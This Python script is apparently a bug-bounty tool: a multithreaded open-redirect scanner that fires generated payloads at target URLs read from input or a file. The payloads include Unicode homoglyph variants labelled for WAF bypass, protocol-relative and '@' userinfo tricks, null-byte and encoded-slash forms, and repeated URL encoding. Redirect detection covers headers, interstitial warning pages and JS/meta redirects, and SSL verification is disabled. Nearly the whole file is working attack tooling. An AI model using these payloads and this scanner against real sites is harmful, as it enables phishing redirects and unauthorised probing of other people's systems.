import requests
import threading
from urllib.parse import quote, urlparse
import sys

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings()

EVIL_DOMAIN = "bing.com"
THREADS = 20
SUSPECT_PARAMS = ["redirect", "url", "next", "dest", "destination", "return", "go", "out", "link"]

def get_pro_payloads(domain):
    # Unicode Variants for WAF Bypass
    unicode_domain = domain.replace('o', 'ο').replace('a', 'ａ').replace('i', 'ｉ')
    
    base_patterns = [
        f"https://{domain}",
        f"https://{unicode_domain}", 
        f"//{domain}",
        f"//{unicode_domain}",
        f"//google.com@{domain}",
        f"/%09/{domain}",
        f"/%5c{domain}",
        f"/%2f%2f{domain}",
        f"///{domain}/..",
        f"//{domain}%00/",
    ]
    
    final_payloads = []
    for p in base_patterns:
        s = quote(p, safe='')
        d = quote(s, safe='')
        t = quote(d, safe='')
        final_payloads.extend([p, s, d, t])
    
    return list(set(final_payloads))

def check_vulnerability(url, payload):
    try:
        # allow_redirects=False is must for header check
        res = requests.get(url + payload, allow_redirects=False, timeout=8, verify=False)
        
        # 1. Header Validation (Standard 30x)
        if res.status_code in [301, 302, 303, 307, 308]:
            location = res.headers.get('Location', '').lower()
            if EVIL_DOMAIN in location and not location.startswith(urlparse(url).netloc):
                return True, f"Header Redirect ({res.status_code})"

        # 2. Interstitial / Warning Page Detection (Airbnb Case)
        # Hum check kar rahe hain ke kya hamara EVIL_DOMAIN page body mein nazar aa raha hai
        body = res.text.lower()
        if EVIL_DOMAIN in body:
            # Agar page par ye words hain, to ye manual redirect bug hai
            warning_indicators = ["leaving", "continue to", "external link", "redirecting"]
            if any(word in body for word in warning_indicators):
                return True, "Manual/Warning Page Redirect"

        # 3. HTML/JS Redirect Validation
        patterns = [
            f"url=https://{EVIL_DOMAIN}",
            f"window.location='https://{EVIL_DOMAIN}'",
            f"window.location.href='https://{EVIL_DOMAIN}'",
            f"location.replace('https://{EVIL_DOMAIN}')"
        ]
        if any(pat in body for pat in patterns):
            return True, "JS/Meta Redirect"
            
    except Exception:
        pass
    return False, None

def engine(target_url, payloads):
    parsed = urlparse(target_url)
    if not parsed.query:
        for param in SUSPECT_PARAMS:
            separator = "&" if "?" in target_url else "?"
            full_test_url = f"{target_url}{separator}{param}="
            run_scan(full_test_url, payloads)
    else:
        # Parameter value replace karne ka logic
        base = target_url.split('=')[0] + "="
        run_scan(base, payloads)

def run_scan(full_url, payloads):
    for p in payloads:
        is_vuln, method = check_vulnerability(full_url, p)
        if is_vuln:
            output = f"[VULNERABLE] [{method}]: {full_url}{p}"
            print(f"\033[92m{output}\033[0m") 
            with open("pro_results.txt", "a") as f:
                f.write(output + "\n")
            break

def main():
    open("pro_results.txt", "a").close() 

    print("""
    ###########################################
    #    PRO OPEN REDIRECT SCANNER v4.5       #
    #    Airbnb & Interstitial Page Support   #
    ###########################################
    """)
    mode = input("1: Single URL\n2: File (urls.txt)\nChoice: ")
    
    payloads = get_pro_payloads(EVIL_DOMAIN)
    targets = []

    if mode == '1':
        targets.append(input("Enter Target: "))
    elif mode == '2':
        f_path = input("File Path: ")
        try:
            with open(f_path, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print("File not found!")
            return

    print(f"[*] Scanning {len(targets)} targets with {len(payloads)} payloads each...")
    
    threads = []
    for t in targets:
        thread = threading.Thread(target=engine, args=(t, payloads))
        threads.append(thread)
        thread.start()
        
        if len(threads) >= THREADS:
            for thread in threads: thread.join()
            threads = []
    
    for thread in threads: thread.join()
    print("\n[*] Scan Complete. Results in 'pro_results.txt'.")

if __name__ == "__main__":
    main()